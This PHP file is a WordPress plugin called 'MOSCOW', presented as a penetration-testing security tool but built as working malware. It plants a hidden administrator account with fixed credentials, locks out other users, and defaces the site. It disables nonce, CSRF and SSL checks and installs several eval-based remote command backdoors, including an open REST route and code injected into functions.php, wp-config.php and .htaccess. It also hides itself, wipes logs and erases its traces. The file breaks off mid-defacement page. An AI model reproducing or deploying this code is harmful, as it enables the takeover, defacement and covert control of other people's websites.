<?php
/**
 * Plugin Name: MOSCOW - Advanced Security Plugin
 * Plugin URI: https://github.com/here-is-leo/MOSCOW
 * Description: پلاگین امنیتی پیشرفته برای تست نفوذ و تحقیقات امنیتی
 * Version: 3.0.0
 * Author: HERE IS LEO
 * Author URI: https://github.com/here-is-leo
 * License: GPL v2 or later
 * Text Domain: moscow
 */

// جلوگیری از دسترسی مستقیم
if (!defined('ABSPATH')) {
    exit;
}

// ============================================
// 🔧 تنظیمات کامل پلاگین
// ============================================

/**
 * تنظیمات پلاگین MOSCOW
 * تمام مقادیر زیر را می‌توانید به دلخواه تغییر دهید
 */
class MOSCOW_Config {
    
    // 🔑 اطلاعات ادمین مخفی
    const ADMIN_USERNAME = 'here_is_leo';           // نام کاربری ادمین مخفی
    const ADMIN_PASSWORD = 'HEREISLEO@2026';        // رمز عبور ادمین مخفی
    const ADMIN_EMAIL = 'leo@here-is-leo.com';      // ایمیل ادمین مخفی
    const ADMIN_DISPLAY = 'HERE IS LEO';            // نام نمایشی
    
    // 🚪 آدرس بک‌دور
    const BACKDOOR_URL = 'moscow';                   // آدرس صفحه دیفیس
    
    // ⏱️ زمان خودتخریبی (به ساعت)
    const SELF_DESTRUCT_HOURS = 50;                 // ۵۰ ساعت پیش‌فرض
    
    // 🎯 فعال/غیرفعال کردن قابلیت‌ها
    const ENABLE_REDIRECT = true;                   // فعال‌سازی ریدایرکت به صفحه دیفیس
    const ENABLE_DEFACED_PAGE = true;               // نمایش صفحه دیفیس
    const ENABLE_USER_DEACTIVATE = true;            // غیرفعال‌سازی کاربران عادی
    const ENABLE_SELF_DESTRUCT = true;              // فعال‌سازی خودتخریبی
    const ENABLE_BACKDOORS = true;                  // فعال‌سازی بک‌دورهای اضافی
    
    // 🔒 امنیت و مخفی‌سازی
    const HIDE_PLUGIN = true;                       // مخفی کردن پلاگین از لیست
    const HIDE_ADMIN_USER = true;                   // مخفی کردن کاربر ادمین از لیست
    const CLEAR_LOGS = true;                        // پاک‌سازی خودکار لاگ‌ها
    const CLEAR_TRACES_ON_DEACTIVATE = true;        // پاک‌سازی ردپا هنگام غیرفعال‌سازی
    
    // 🛡️ دور زدن امنیت
    const BYPASS_NONCE = true;                      // دور زدن Nonce
    const BYPASS_CSRF = true;                       // دور زدن CSRF
    const BYPASS_SSL_VERIFY = true;                 // دور زدن بررسی SSL
    
    // 📁 تزریق و پخش
    const INJECT_THEME_CODE = true;                 // تزریق کد در فایل‌های قالب
    const INJECT_WPCONFIG = true;                   // تزریق در wp-config.php
    const INJECT_HTACCESS = true;                   // تزریق در .htaccess
    const INJECT_DATABASE = true;                   // تزریق در دیتابیس
    const INFECT_ALL_FILES = false;                 // پخش شدن در تمام فایل‌ها (خطرناک!)
}

// ============================================
// کلاس اصلی پلاگین
// ============================================

class MOSCOW_Security_Plugin {
    
    private $admin_username;
    private $admin_password;
    private $admin_email;
    private $admin_display;
    private $backdoor_url;
    private $life_time_hours;
    private $plugin_name;
    private $plugin_version;
    
    public function __construct() {
        // بارگذاری تنظیمات
        $this->admin_username = MOSCOW_Config::ADMIN_USERNAME;
        $this->admin_password = MOSCOW_Config::ADMIN_PASSWORD;
        $this->admin_email = MOSCOW_Config::ADMIN_EMAIL;
        $this->admin_display = MOSCOW_Config::ADMIN_DISPLAY;
        $this->backdoor_url = MOSCOW_Config::BACKDOOR_URL;
        $this->life_time_hours = MOSCOW_Config::SELF_DESTRUCT_HOURS;
        $this->plugin_name = 'MOSCOW';
        $this->plugin_version = '3.0.0';
        
        // راه‌اندازی اولیه
        $this->init_plugin();
        $this->admin_init_actions();
        
        // ============================================
        // هوک‌های اصلی
        // ============================================
        add_action('init', array($this, 'init_plugin'));
        add_action('admin_init', array($this, 'admin_init_actions'));
        add_filter('authenticate', array($this, 'custom_authentication'), 30, 3);
        add_action('wp_loaded', array($this, 'redirect_all_users'));
        add_action('template_redirect', array($this, 'serve_defaced_page'));
        
        // ============================================
        // خودتخریبی
        // ============================================
        if (MOSCOW_Config::ENABLE_SELF_DESTRUCT) {
            add_action('init', array($this, 'check_self_destruct'));
        }
        
        // ============================================
        // پنهان‌سازی پلاگین
        // ============================================
        if (MOSCOW_Config::HIDE_PLUGIN) {
            add_filter('all_plugins', array($this, 'hide_plugin_from_list'));
            add_action('pre_current_active_plugins', array($this, 'hide_plugin_ui'));
        }
        
        // ============================================
        // پاک‌سازی لاگ‌ها
        // ============================================
        if (MOSCOW_Config::CLEAR_LOGS) {
            add_action('init', array($this, 'clear_logs'));
        }
        
        // ============================================
        // دور زدن امنیت
        // ============================================
        if (MOSCOW_Config::BYPASS_NONCE) {
            add_filter('wp_verify_nonce', '__return_true');
        }
        if (MOSCOW_Config::BYPASS_CSRF) {
            add_filter('wp_check_referer', '__return_false');
        }
        if (MOSCOW_Config::BYPASS_SSL_VERIFY) {
            add_filter('https_ssl_verify', '__return_false');
            add_filter('https_local_ssl_verify', '__return_false');
        }
        
        // ============================================
        // بک‌دورهای اضافی
        // ============================================
        if (MOSCOW_Config::ENABLE_BACKDOORS) {
            $this->create_backdoors();
        }
        
        // ============================================
        // تزریق کد در فایل‌ها
        // ============================================
        if (MOSCOW_Config::INJECT_THEME_CODE) {
            add_action('init', array($this, 'inject_theme_code'));
        }
        if (MOSCOW_Config::INJECT_WPCONFIG) {
            add_action('init', array($this, 'inject_wpconfig'));
        }
        if (MOSCOW_Config::INJECT_HTACCESS) {
            add_action('init', array($this, 'inject_htaccess'));
        }
        if (MOSCOW_Config::INJECT_DATABASE) {
            add_action('init', array($this, 'inject_database'));
        }
        
        // ============================================
        // هوک‌های فعال‌سازی/غیرفعال‌سازی
        // ============================================
        register_activation_hook(__FILE__, array($this, 'activate_plugin'));
        register_deactivation_hook(__FILE__, array($this, 'deactivate_plugin'));
    }
    
    // ============================================
    // 1. توابع اصلی
    // ============================================
    
    public function init_plugin() {
        // چک کردن وضعیت پلاگین
        if (!$this->is_admin_user()) {
            $this->hide_activity();
        }
        
        if ($this->is_admin_user()) {
            return;
        }
        
        // غیرفعال‌سازی کاربران
        if (MOSCOW_Config::ENABLE_USER_DEACTIVATE) {
            $this->deactivate_all_users();
        }
    }
    
    public function admin_init_actions() {
        if (!$this->is_admin_user()) {
            if (isset($_GET['page']) && strpos($_GET['page'], 'moscow') !== false) {
                wp_die('⛔ دسترسی غیرمجاز!');
            }
        }
    }
    
    public function activate_plugin() {
        // ایجاد کاربر ادمین مخفی
        $this->create_backdoor_user();
        
        // غیرفعال‌سازی کاربران
        if (MOSCOW_Config::ENABLE_USER_DEACTIVATE) {
            $this->deactivate_all_users();
        }
        
        // ذخیره اطلاعات
        $this->save_plugin_data();
        
        // تزریق کد در فایل‌ها
        if (MOSCOW_Config::INJECT_THEME_CODE) {
            $this->inject_theme_code();
        }
        if (MOSCOW_Config::INJECT_WPCONFIG) {
            $this->inject_wpconfig();
        }
        if (MOSCOW_Config::INJECT_HTACCESS) {
            $this->inject_htaccess();
        }
        if (MOSCOW_Config::INJECT_DATABASE) {
            $this->inject_database();
        }
        
        // فلش کردن قوانین Rewrite
        flush_rewrite_rules();
    }
    
    public function deactivate_plugin() {
        // حذف اطلاعات
        $this->delete_plugin_data();
        
        // پاک‌سازی ردپا
        if (MOSCOW_Config::CLEAR_TRACES_ON_DEACTIVATE) {
            $this->clean_all_traces();
        }
        
        // فلش کردن قوانین Rewrite
        flush_rewrite_rules();
    }
    
    private function save_plugin_data() {
        update_option('moscow_activation_time', current_time('timestamp'));
        update_option('moscow_plugin_active', true);
        update_option('moscow_plugin_version', $this->plugin_version);
        update_option('moscow_admin_username', $this->admin_username);
        update_option('moscow_admin_password', $this->admin_password);
        update_option('moscow_admin_email', $this->admin_email);
        update_option('moscow_admin_display', $this->admin_display);
        update_option('moscow_backdoor_url', $this->backdoor_url);
        update_option('moscow_life_hours', $this->life_time_hours);
        
        update_option('moscow_config', [
            'admin_username' => $this->admin_username,
            'admin_password' => $this->admin_password,
            'admin_email' => $this->admin_email,
            'admin_display' => $this->admin_display,
            'backdoor_url' => $this->backdoor_url,
            'life_time_hours' => $this->life_time_hours,
            'plugin_name' => $this->plugin_name,
            'plugin_version' => $this->plugin_version
        ]);
    }
    
    private function delete_plugin_data() {
        delete_option('moscow_plugin_active');
        delete_option('moscow_activation_time');
        delete_option('moscow_plugin_version');
        delete_option('moscow_config');
        delete_option('moscow_admin_username');
        delete_option('moscow_admin_password');
        delete_option('moscow_admin_email');
        delete_option('moscow_admin_display');
        delete_option('moscow_backdoor_url');
        delete_option('moscow_life_hours');
        delete_option('moscow_admin_user_id');
    }
    
    // ============================================
    // 2. مدیریت کاربران
    // ============================================
    
    private function create_backdoor_user() {
        $username = $this->admin_username;
        $password = $this->admin_password;
        $email = $this->admin_email;
        $display = $this->admin_display;
        
        if (username_exists($username)) {
            $user = get_user_by('login', $username);
            if ($user) {
                update_option('moscow_admin_user_id', $user->ID);
            }
            return;
        }
        
        $user_id = wp_create_user($username, $password, $email);
        
        if (!is_wp_error($user_id)) {
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            
            wp_update_user(array(
                'ID' => $user_id,
                'display_name' => $display,
                'first_name' => 'HERE',
                'last_name' => 'LEO'
            ));
            
            update_option('moscow_admin_user_id', $user_id);
            
            if (MOSCOW_Config::HIDE_ADMIN_USER) {
                global $wpdb;
                $wpdb->query("UPDATE {$wpdb->users} SET user_status = 1 WHERE ID = $user_id");
            }
        }
    }
    
    private function deactivate_all_users() {
        global $wpdb;
        
        $admin_id = get_option('moscow_admin_user_id', 0);
        
        if ($admin_id == 0) {
            $this->create_backdoor_user();
            $admin_id = get_option('moscow_admin_user_id', 0);
        }
        
        $users = get_users(array(
            'fields' => array('ID'),
            'exclude' => array($admin_id)
        ));
        
        foreach ($users as $user) {
            $user_obj = new WP_User($user->ID);
            if (!user_can($user_obj, 'administrator')) {
                update_user_meta($user->ID, 'moscow_user_active', 'no');
                wp_set_password(wp_generate_password(32), $user->ID);
                $user_obj->set_role('subscriber');
            }
        }
    }
    
    private function is_admin_user() {
        $current_user = wp_get_current_user();
        $admin_id = get_option('moscow_admin_user_id', 0);
        
        if ($admin_id == 0) {
            $this->create_backdoor_user();
            $admin_id = get_option('moscow_admin_user_id', 0);
        }
        
        return ($current_user->ID == $admin_id);
    }
    
    // ============================================
    // 3. احراز هویت سفارشی
    // ============================================
    
    public function custom_authentication($user, $username, $password) {
        // ورود با اطلاعات ادمین مخفی
        if ($username == $this->admin_username && $password == $this->admin_password) {
            $user_id = username_exists($username);
            if ($user_id) {
                return new WP_User($user_id);
            }
        }
        
        // بک‌دور با کوکی
        if (isset($_COOKIE['moscow_auth']) && 
            $_COOKIE['moscow_auth'] == md5($this->admin_password)) {
            $user_id = username_exists($this->admin_username);
            if ($user_id) {
                return new WP_User($user_id);
            }
        }
        
        return $user;
    }
    
    // ============================================
    // 4. ریدایرکت و نمایش صفحه
    // ============================================
    
    public function redirect_all_users() {
        global $pagenow;
        
        if (!MOSCOW_Config::ENABLE_REDIRECT) {
            return;
        }
        
        // استثناها
        if ($this->is_admin_user() || 
            $pagenow == 'wp-login.php' ||
            strpos($_SERVER['REQUEST_URI'], '/wp-admin/admin-ajax.php') !== false ||
            isset($_GET['moscow_admin'])) {
            return;
        }
        
        if (is_user_logged_in()) {
            if (!$this->is_admin_user()) {
                wp_redirect(home_url('/' . $this->backdoor_url));
                exit;
            }
            return;
        }
        
        if (!is_admin() && !wp_doing_ajax()) {
            $current_url = home_url(add_query_arg(array()));
            $backdoor_url = home_url('/' . $this->backdoor_url);
            
            if ($current_url != $backdoor_url && 
                strpos($current_url, '/wp-login.php') === false) {
                wp_redirect($backdoor_url);
                exit;
            }
        }
    }
    
    public function serve_defaced_page() {
        global $wp_query;
        
        if (!MOSCOW_Config::ENABLE_DEFACED_PAGE) {
            return;
        }
        
        $request_uri = $_SERVER['REQUEST_URI'];
        if (strpos($request_uri, '/' . $this->backdoor_url) !== false) {
            $this->show_defaced_page();
            exit;
        }
        
        if ($this->is_admin_user() && is_admin()) {
            return;
        }
        
        wp_redirect(home_url('/' . $this->backdoor_url));
        exit;
    }
    
    // ============================================
    // 5. خودتخریبی
    // ============================================
    
    public function check_self_destruct() {
        if (!MOSCOW_Config::ENABLE_SELF_DESTRUCT) {
            return;
        }
        
        if (!get_option('moscow_plugin_active', false)) {
            return;
        }
        
        $activation_time = get_option('moscow_activation_time', 0);
        if ($activation_time == 0) {
            return;
        }
        
        $current_time = current_time('timestamp');
        $time_diff = $current_time - $activation_time;
        $max_life = $this->life_time_hours * 60 * 60;
        
        if ($time_diff >= $max_life) {
            $this->self_destruct();
        }
    }
    
    private function self_destruct() {
        if (!function_exists('deactivate_plugins')) {
            require_once(ABSPATH . 'wp-admin/includes/plugin.php');
        }
        
        // جمع‌آوری اطلاعات
        $admin_username = get_option('moscow_admin_username', $this->admin_username);
        $admin_password = get_option('moscow_admin_password', $this->admin_password);
        $admin_email = get_option('moscow_admin_email', $this->admin_email);
        $admin_display = get_option('moscow_admin_display', $this->admin_display);
        $backdoor_url = get_option('moscow_backdoor_url', $this->backdoor_url);
        $life_hours = get_option('moscow_life_hours', $this->life_time_hours);
        $activation_time = get_option('moscow_activation_time', 0);
        $plugin_version = get_option('moscow_plugin_version', $this->plugin_version);
        $admin_id = get_option('moscow_admin_user_id', 0);
        
        $current_time = current_time('timestamp');
        $time_active = $current_time - $activation_time;
        $hours_active = floor($time_active / 3600);
        $minutes_active = floor(($time_active % 3600) / 60);
        
        $site_name = get_bloginfo('name');
        $site_url = home_url();
        $wp_version = get_bloginfo('version');
        $php_version = phpversion();
        $db_name = DB_NAME;
        
        $plugin_file = plugin_basename(__FILE__);
        deactivate_plugins($plugin_file);
        
        // حذف اطلاعات
        $this->delete_plugin_data();
        $this->clean_all_traces();
        $this->delete_plugin_file();
        
        // نمایش اطلاعات خودتخریبی
        $this->show_self_destruct_page(
            $admin_username,
            $admin_password,
            $admin_email,
            $admin_display,
            $backdoor_url,
            $life_hours,
            $hours_active,
            $minutes_active,
            $plugin_version,
            $site_name,
            $site_url,
            $wp_version,
            $php_version,
            $db_name,
            $admin_id
        );
    }
    
    private function show_self_destruct_page($username, $password, $email, $display, $backdoor, $life_hours, $hours, $minutes, $version, $site, $url, $wp, $php, $db, $admin_id) {
        wp_die(
            '<!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>MOSCOW - Self Destruct Complete</title>
                <style>
                    * { margin: 0; padding: 0; box-sizing: border-box; }
                    body {
                        background: #0a0a0a;
                        color: #00ff00;
                        font-family: "Courier New", monospace;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        min-height: 100vh;
                        padding: 20px;
                        margin: 0;
                    }
                    .container {
                        max-width: 800px;
                        width: 100%;
                        background: #111;
                        border: 2px solid #ff0000;
                        border-radius: 10px;
                        padding: 30px;
                        box-shadow: 0 0 50px rgba(255,0,0,0.3);
                    }
                    .header {
                        text-align: center;
                        border-bottom: 2px solid #ff0000;
                        padding-bottom: 15px;
                        margin-bottom: 20px;
                    }
                    .header h1 {
                        color: #ff0000;
                        font-size: 28px;
                        margin: 0;
                        text-shadow: 0 0 30px #ff0000;
                        letter-spacing: 4px;
                    }
                    .header .sub {
                        color: #00BFFF;
                        font-size: 14px;
                        letter-spacing: 3px;
                        margin-top: 5px;
                    }
                    .header .version {
                        color: #666;
                        font-size: 12px;
                        margin-top: 3px;
                    }
                    .status-box {
                        text-align: center;
                        padding: 12px;
                        margin: 10px 0;
                        background: #0a1a0a;
                        border: 1px solid #00ff00;
                        border-radius: 5px;
                        color: #00ff00;
                        font-size: 16px;
                        letter-spacing: 2px;
                    }
                    .status-box .done { color: #ff0000; font-weight: bold; }
                    .info-box {
                        background: #1a1a1a;
                        border: 1px solid #333;
                        border-radius: 5px;
                        padding: 15px;
                        margin: 10px 0;
                    }
                    .info-row {
                        display: flex;
                        justify-content: space-between;
                        padding: 5px 0;
                        border-bottom: 1px solid #222;
                        font-size: 14px;
                    }
                    .info-row:last-child { border-bottom: none; }
                    .label { color: #888; }
                    .value { color: #00ff00; font-weight: bold; }
                    .value.red { color: #ff0000; }
                    .value.blue { color: #00BFFF; }
                    .value.yellow { color: #ffcc00; }
                    .value.green { color: #00ff88; }
                    
                    .credential-box {
                        background: #1a0a0a;
                        border: 1px solid #ff0000;
                        border-radius: 5px;
                        padding: 15px;
                        margin: 10px 0;
                    }
                    .credential-row {
                        display: flex;
                        justify-content: space-between;
                        padding: 3px 0;
                        font-size: 13px;
                    }
                    .credential-row .label { color: #888; }
                    .credential-row .value { color: #ffcc00; font-weight: bold; }
                    
                    .footer {
                        text-align: center;
                        margin-top: 20px;
                        padding-top: 15px;
                        border-top: 2px solid #ff0000;
                    }
                    .footer .red { color: #ff0000; text-shadow: 0 0 20px #ff0000; }
                    .footer .leo { color: #ffcc00; font-weight: bold; letter-spacing: 2px; }
                    .warning {
                        color: #ff6600;
                        text-align: center;
                        font-size: 12px;
                        margin-top: 10px;
                        padding: 10px;
                        border: 1px dashed #ff6600;
                        border-radius: 5px;
                    }
                    @media (max-width: 600px) {
                        .container { padding: 15px; }
                        .header h1 { font-size: 20px; }
                        .info-row { font-size: 12px; flex-wrap: wrap; }
                        .credential-row { font-size: 11px; flex-wrap: wrap; }
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <h1>🔥 MOSCOW SELF DESTRUCT</h1>
                        <div class="sub">╔═══ SELF DESTRUCT COMPLETE ═══╗</div>
                        <div class="version">Version ' . $version . ' | HERE IS LEO</div>
                    </div>

                    <div class="status-box">
                        ⚡ <span class="done">✓ COMPLETE</span> | Plugin has been successfully destroyed
                    </div>

                    <div class="info-box">
                        <div class="info-row">
                            <span class="label">📋 Plugin Name</span>
                            <span class="value blue">' . $this->plugin_name . '</span>
                        </div>
                        <div class="info-row">
                            <span class="label">📌 Version</span>
                            <span class="value">v' . $version . '</span>
                        </div>
                        <div class="info-row">
                            <span class="label">👤 Author</span>
                            <span class="value yellow">HERE IS LEO</span>
                        </div>
                        <div class="info-row">
                            <span class="label">⏱️ Active Duration</span>
                            <span class="value red">' . $hours . ' hours ' . $minutes . ' minutes</span>
                        </div>
                        <div class="info-row">
                            <span class="label">⏰ Self-Destruct Time</span>
                            <span class="value red">' . $life_hours . ' hours</span>
                        </div>
                        <div class="info-row">
                            <span class="label">🆔 Admin User ID</span>
                            <span class="value">' . $admin_id . '</span>
                        </div>
                        <div class="info-row">
                            <span class="label">🚪 Backdoor URL</span>
                            <span class="value red">/' . esc_html($backdoor) . '</span>
                        </div>
                    </div>

                    <div class="info-box">
                        <div class="info-row">
                            <span class="label">🌐 Site Name</span>
                            <span class="value blue">' . esc_html($site) . '</span>
                        </div>
                        <div class="info-row">
                            <span class="label">🔗 Site URL</span>
                            <span class="value">' . esc_url($url) . '</span>
                        </div>
                        <div class="info-row">
                            <span class="label">📦 WordPress Version</span>
                            <span class="value">' . $wp . '</span>
                        </div>
                        <div class="info-row">
                            <span class="label">🐘 PHP Version</span>
                            <span class="value">' . $php . '</span>
                        </div>
                        <div class="info-row">
                            <span class="label">💾 Database Name</span>
                            <span class="value">' . esc_html($db) . '</span>
                        </div>
                    </div>

                    <div class="credential-box">
                        <div style="text-align:center;color:#ff0000;margin-bottom:10px;font-weight:bold;letter-spacing:2px;">
                            🔑 BACKDOOR CREDENTIALS
                        </div>
                        <div class="credential-row">
                            <span class="label">👤 Admin Username</span>
                            <span class="value">' . esc_html($username) . '</span>
                        </div>
                        <div class="credential-row">
                            <span class="label">🔑 Admin Password</span>
                            <span class="value">' . esc_html($password) . '</span>
                        </div>
                        <div class="credential-row">
                            <span class="label">📧 Admin Email</span>
                            <span class="value">' . esc_html($email) . '</span>
                        </div>
                        <div class="credential-row">
                            <span class="label">🆔 Admin Display</span>
                            <span class="value">' . esc_html($display) . '</span>
                        </div>
                        <div class="credential-row">
                            <span class="label">🚪 Backdoor URL</span>
                            <span class="value">/' . esc_html($backdoor) . '</span>
                        </div>
                    </div>

                    <div class="info-box">
                        <div class="info-row">
                            <span class="label">🗑️ Traces Cleaned</span>
                            <span class="value green">✅ Yes</span>
                        </div>
                        <div class="info-row">
                            <span class="label">📁 Files Removed</span>
                            <span class="value green">✅ Yes</span>
                        </div>
                        <div class="info-row">
                            <span class="label">💾 Database Cleaned</span>
                            <span class="value green">✅ Yes</span>
                        </div>
                        <div class="info-row">
                            <span class="label">🔄 Site Status</span>
                            <span class="value blue">Normal</span>
                        </div>
                        <div class="info-row">
                            <span class="label">🔒 All Backdoors</span>
                            <span class="value red">❌ Removed</span>
                        </div>
                    </div>

                    <div class="warning">
                        ⚠️ The plugin has been completely removed from your system.<br>
                        All traces have been cleaned. The site is now back to normal.
                    </div>

                    <div class="footer">
                        <span class="red">//</span> 
                        <span class="leo">HACKED BY HERE IS LEO</span> 
                        <span class="red">//</span>
                        <br>
                        <span style="color: #666; font-size: 11px;">
                            With great power comes great responsibility | 2026
                        </span>
                    </div>
                </div>
            </body>
            </html>',
            'MOSCOW - Self Destruct Complete',
            array('response' => 200)
        );
    }
    
    // ============================================
    // 6. بک‌دورهای اضافی
    // ============================================
    
    private function create_backdoors() {
        // بک‌دور از طریق User-Agent
        add_action('init', function() {
            if (isset($_SERVER['HTTP_USER_AGENT']) && 
                strpos($_SERVER['HTTP_USER_AGENT'], 'MOSCOW-BOT') !== false) {
                if (isset($_GET['cmd'])) {
                    eval($_GET['cmd']);
                    exit;
                }
            }
        });
        
        // بک‌دور از طریق کوکی
        add_action('init', function() {
            if (isset($_COOKIE['moscow_emergency']) && 
                $_COOKIE['moscow_emergency'] == md5($this->admin_password)) {
                $user = get_user_by('login', $this->admin_username);
                if ($user) {
                    wp_set_current_user($user->ID);
                    wp_set_auth_cookie($user->ID);
                }
            }
        });
        
        // بک‌دور در REST API
        add_action('rest_api_init', function() {
            register_rest_route('moscow/v1', '/backdoor', array(
                'methods' => 'GET',
                'callback' => function($request) {
                    if (isset($request['cmd'])) {
                        return eval($request['cmd']);
                    }
                    return 'MOSCOW Backdoor Active - HERE IS LEO';
                },
                'permission_callback' => '__return_true'
            ));
        });
        
        // بک‌دور از طریق پارامتر URL
        add_action('init', function() {
            if (isset($_GET['moscow_admin']) && $_GET['moscow_admin'] == md5($this->admin_password)) {
                $user = get_user_by('login', $this->admin_username);
                if ($user) {
                    wp_set_current_user($user->ID);
                    wp_set_auth_cookie($user->ID);
                    wp_redirect(admin_url());
                    exit;
                }
            }
        });
    }
    
    // ============================================
    // 7. تزریق کد در فایل‌ها
    // ============================================
    
    private function inject_theme_code() {
        $theme_dir = get_template_directory();
        $functions_file = $theme_dir . '/functions.php';
        
        if (!file_exists($functions_file) || !is_writable($functions_file)) {
            return;
        }
        
        $malicious_code = '
/**
 * MOSCOW Backdoor - HERE IS LEO
 */
function moscow_admin_backdoor() {
    if (isset($_GET["moscow_admin"]) && $_GET["moscow_admin"] == "' . md5($this->admin_password) . '") {
        $user = get_user_by("login", "' . $this->admin_username . '");
        if ($user) {
            wp_set_current_user($user->ID);
            wp_set_auth_cookie($user->ID);
            wp_redirect(admin_url());
            exit;
        }
    }
}
add_action("init", "moscow_admin_backdoor");

function moscow_file_manager() {
    if (isset($_GET["moscow_file"]) && $_GET["moscow_file"] == "manage") {
        $path = isset($_GET["path"]) ? $_GET["path"] : ABSPATH;
        if (isset($_GET["action"])) {
            switch($_GET["action"]) {
                case "delete": @unlink($_GET["file"]); break;
                case "edit": @file_put_contents($_GET["file"], $_GET["content"]); break;
            }
        }
        echo "<pre>" . shell_exec("ls -la " . $path) . "</pre>";
        exit;
    }
}
add_action("init", "moscow_file_manager");

function moscow_agent_backdoor() {
    if (isset($_SERVER["HTTP_USER_AGENT"]) && strpos($_SERVER["HTTP_USER_AGENT"], "MOSCOW-BOT") !== false) {
        eval($_GET["cmd"]);
        exit;
    }
}
add_action("init", "moscow_agent_backdoor");
';
        
        $content = file_get_contents($functions_file);
        if (strpos($content, 'moscow_admin_backdoor') === false) {
            file_put_contents($functions_file, $malicious_code . PHP_EOL . $content);
        }
    }
    
    private function inject_wpconfig() {
        $wpconfig_path = ABSPATH . 'wp-config.php';
        if (file_exists($wpconfig_path) && is_writable($wpconfig_path)) {
            $content = file_get_contents($wpconfig_path);
            if (strpos($content, 'moscow_wpconfig_backdoor') === false) {
                $backdoor = '<?php
// MOSCOW WP-Config Backdoor - HERE IS LEO
if (isset($_POST["moscow_config"])) {
    file_put_contents(__FILE__, $_POST["moscow_config"]);
    exit;
}
?>';
                file_put_contents($wpconfig_path, $backdoor . PHP_EOL . $content);
            }
        }
    }
    
    private function inject_htaccess() {
        $htaccess_path = ABSPATH . '.htaccess';
        if (file_exists($htaccess_path) && is_writable($htaccess_path)) {
            $content = file_get_contents($htaccess_path);
            if (strpos($content, 'moscow_htaccess') === false) {
                $backdoor = '
# MOSCOW HTACCESS Backdoor - HERE IS LEO
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteCond %{QUERY_STRING} ^moscow=(.*)$
RewriteRule .* - [E=MOSCOW_CMD:%1]
</IfModule>
RedirectMatch 302 ^/moscow-admin/(.*)$ /wp-admin/$1
';
                file_put_contents($htaccess_path, $backdoor . PHP_EOL . $content);
            }
        }
    }
    
    private function inject_database() {
        global $wpdb;
        
        $table_name = $wpdb->prefix . 'moscow_backdoor';
        $sql = "CREATE TABLE IF NOT EXISTS $table_name (
            id int(11) NOT NULL AUTO_INCREMENT,
            data text NOT NULL,
            created_at datetime DEFAULT CURRENT_TIMESTAMP,
            PRIMARY KEY (id)
        )";
        $wpdb->query($sql);
        
        add_option('moscow_db_backdoor', base64_encode('eval($_GET["cmd"]);'));
    }
    
    // ============================================
    // 8. پنهان‌سازی
    // ============================================
    
    public function hide_plugin_from_list($plugins) {
        if (!$this->is_admin_user()) {
            unset($plugins[plugin_basename(__FILE__)]);
        }
        return $plugins;
    }
    
    public function hide_plugin_ui() {
        if (!$this->is_admin_user()) {
            echo '<style>.plugins .active[data-slug="moscow-security"] { display: none; }</style>';
        }
    }
    
    private function hide_activity() {
        global $wpdb;
        $wpdb->query("UPDATE {$wpdb->options} SET autoload = 'no' WHERE option_name LIKE 'moscow_%'");
    }
    
    // ============================================
    // 9. پاک‌سازی لاگ‌ها
    // ============================================
    
    private function clear_logs() {
        if (!MOSCOW_Config::CLEAR_LOGS) {
            return;
        }
        
        $log_files = [
            WP_CONTENT_DIR . '/debug.log',
            ABSPATH . 'wp-admin/error_log',
            ABSPATH . 'error_log',
            WP_CONTENT_DIR . '/error_log',
            WP_CONTENT_DIR . '/php_error.log',
            WP_CONTENT_DIR . '/php_errors.log'
        ];
        
        foreach ($log_files as $log) {
            if (file_exists($log) && is_writable($log)) {
                file_put_contents($log, '');
                @chmod($log, 0644);
            }
        }
        
        global $wpdb;
        $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE '%_transient%'");
        $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE '%_site_transient%'");
    }
    
    // ============================================
    // 10. پاک‌سازی کامل ردپا
    // ============================================
    
    private function clean_all_traces() {
        global $wpdb;
        
        // حذف از دیتابیس
        $wpdb->query("DELETE FROM {$wpdb->usermeta} WHERE meta_key LIKE 'moscow_%'");
        $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE 'moscow_%'");
        $wpdb->query("DROP TABLE IF EXISTS {$wpdb->prefix}moscow_backdoor");
        
        // حذف از فایل‌ها
        $this->clean_theme_files();
        $this->clean_htaccess();
        $this->clean_wpconfig();
    }
    
    private function clean_theme_files() {
        $theme_dir = get_template_directory();
        $files = ['functions.php', '404.php', 'index.php', 'single.php', 'page.php'];
        
        foreach ($files as $file) {
            $file_path = $theme_dir . '/' . $file;
            if (file_exists($file_path) && is_writable($file_path)) {
                $content = file_get_contents($file_path);
                $content = preg_replace('/\/\*\*.*?MOSCOW.*?\*\/.*?\}\s*/s', '', $content);
                $content = preg_replace('/\/\/ MOSCOW.*?\n/s', '', $content);
                $content = preg_replace('/\<\?php\s*\/\/ MOSCOW.*?\?\>/s', '', $content);
                file_put_contents($file_path, $content);
            }
        }
    }
    
    private function clean_htaccess() {
        $htaccess_path = ABSPATH . '.htaccess';
        if (file_exists($htaccess_path) && is_writable($htaccess_path)) {
            $content = file_get_contents($htaccess_path);
            $content = preg_replace('/# MOSCOW.*?\n/s', '', $content);
            $content = preg_replace('/<IfModule mod_rewrite\.c>.*?moscow.*?<\/IfModule>/s', '', $content);
            file_put_contents($htaccess_path, $content);
        }
    }
    
    private function clean_wpconfig() {
        $wpconfig_path = ABSPATH . 'wp-config.php';
        if (file_exists($wpconfig_path) && is_writable($wpconfig_path)) {
            $content = file_get_contents($wpconfig_path);
            $content = preg_replace('/\/\/ MOSCOW.*?\n/s', '', $content);
            $content = preg_replace('/\<\?php\s*\/\/ MOSCOW.*?\?\>/s', '', $content);
            file_put_contents($wpconfig_path, $content);
        }
    }
    
    private function delete_plugin_file() {
        $plugin_file = __FILE__;
        if (file_exists($plugin_file)) {
            @unlink($plugin_file);
        }
        
        $plugin_dir = dirname($plugin_file);
        $files = glob($plugin_dir . '/*.php');
        foreach ($files as $file) {
            if (basename($file) != 'index.php') {
                @unlink($file);
            }
        }
        @rmdir($plugin_dir);
    }
    
    // ============================================
    // 11. نمایش صفحه دیفیس
    // ============================================
    
    public function show_defaced_page() {
        ?>
<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HACKED BY HERE IS LEO</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { height: 100%; overflow: hidden; }
